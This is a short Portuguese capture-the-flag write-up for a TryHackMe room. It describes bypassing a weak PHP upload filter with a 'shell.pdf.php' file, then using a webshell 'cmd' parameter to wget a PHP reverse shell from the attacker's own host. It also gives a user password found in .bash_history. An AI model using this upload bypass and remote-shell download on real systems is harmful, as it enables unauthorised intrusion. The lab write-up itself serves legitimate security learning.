#ctf
https://tryhackme.com/room/hackervshacker

## Recon

Usando NMAP apenas as portas 22 (SSH) e 80 (HTTP) estão abertas.
O site conta com um upload de arquivo pdf e é possível ver através do `/upload.php` que ele armazena em `cvs/` o arquivo e verifica se o arquivo é pdf apenas comparando se a string contém ".pdf" no nome.

```html
Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:
$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
-->
```

Tentei fazer o upload de um arquivo `shell.pdf.php` e acessei `cvs/shell.pdf.php` não era o meu shell reverso mas sim outra webshell que através do parâmetro `cmd` foi possível executar os comandos de forma remota.
Tentei passar alguns comandos com o nc, python, bash, para conseguir acesso a shell mas não consegui, então minha solução foi abrir um site na minha máquina e através do *wget*, baixar uma shell reverso em php e rodar ele pelo site vulnerável e consegui o acesso ao shell do site.

```
http://IP-ALVO/cvs/shell.pdf.php?cmd=wget%20http://MEU-IP:8000/webshell.pdf.php
```

## Privesc

Em `/home/lachlan` é possível ler o que tem no `.bash_history` e nele há a senha para acessar este usuário: **thisistheway123**.
